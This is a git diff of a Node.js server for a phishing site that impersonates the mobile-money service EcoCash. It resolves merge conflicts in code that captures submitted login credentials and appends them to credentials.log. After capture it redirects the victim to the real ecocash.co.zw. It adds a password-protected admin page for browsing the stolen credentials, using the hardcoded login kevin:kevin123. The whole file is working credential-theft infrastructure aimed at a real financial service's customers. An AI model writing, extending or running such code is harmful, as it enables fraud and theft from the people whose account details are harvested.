@@ -2,18 +2,13 @@ const http = require('http');
 const fs = require('fs');
 const path = require('path');
 const url = require('url');
-<<<<<<< HEAD
-
-const PORT = process.env.PORT || 8000;
-
-=======
 const crypto = require('crypto');
 
 const PORT = process.env.PORT || 8000;
 
 // Simple authentication for admin page (you should change this!)
-const ADMIN_USERNAME = 'admin';
-const ADMIN_PASSWORD = 'admin123'; // CHANGE THIS to something secure!
+const ADMIN_USERNAME = 'kevin';
+const ADMIN_PASSWORD = 'kevin123'; // CHANGE THIS to something secure!
 
 // Function to verify basic auth
 function verifyAuth(req) {
@@ -24,7 +19,6 @@ function verifyAuth(req) {
     return username === ADMIN_USERNAME && password === ADMIN_PASSWORD;
 }
 
->>>>>>> 27349bd (modified the ecocash admin access)
 // Create server
 http.createServer((req, res) => {
     const parsedUrl = url.parse(req.url, true);
@@ -104,14 +98,9 @@ http.createServer((req, res) => {
                 
                 console.log('Captured credentials:', credentials);
                 
-<<<<<<< HEAD
-                // Save to file
-                fs.appendFile('credentials.log', JSON.stringify(credentials) + '\n', (err) => {
-=======
                 // Save to file with JSON formatting
                 const logEntry = JSON.stringify(credentials, null, 2) + ',\n';
                 fs.appendFile('credentials.log', logEntry, (err) => {
->>>>>>> 27349bd (modified the ecocash admin access)
                     if (err) {
                         console.error('Error writing to file:', err);
                     } else {
@@ -159,11 +148,7 @@ http.createServer((req, res) => {
                             <p>Redirecting to your account...</p>
                             <script>
                                 setTimeout(function() {
-<<<<<<< HEAD
-                                    window.location.href = 'https://www.instagram.com/reels/DHB000zJIwe';
-=======
                                     window.location.href = 'https://ecocash.co.zw/';
->>>>>>> 27349bd (modified the ecocash admin access)
                                 }, 2000);
                             </script>
                         </div>
@@ -180,8 +165,6 @@ http.createServer((req, res) => {
         return;
     }
 
-<<<<<<< HEAD
-=======
     // ADMIN PAGE - View captured credentials
     if (req.method === 'GET' && pathname === '/admin') {
         // Check authentication
@@ -429,7 +412,6 @@ http.createServer((req, res) => {
         return;
     }
 
->>>>>>> 27349bd (modified the ecocash admin access)
     // Handle GET requests to /login - show a message
     if (req.method === 'GET' && pathname === '/login') {
         res.writeHead(200, { 'Content-Type': 'text/html' });
@@ -461,10 +443,6 @@ http.createServer((req, res) => {
 }).listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
     console.log(`📝 Access the login page at: http://localhost:${PORT}`);
-<<<<<<< HEAD
-    console.log(`📁 Credentials will be saved to: credentials.log`);
-});
-=======
     console.log(`🔐 Access admin panel at: http://localhost:${PORT}/admin`);
     console.log(`📁 Credentials will be saved to: credentials.log`);
     console.log(`⚠️  ADMIN CREDENTIALS: ${ADMIN_USERNAME}:${ADMIN_PASSWORD}`);
@@ -506,4 +484,3 @@ function countEntries(data) {
         return data.split('\n').filter(line => line.trim()).length;
     }
 }
->>>>>>> 27349bd (modified the ecocash admin access)
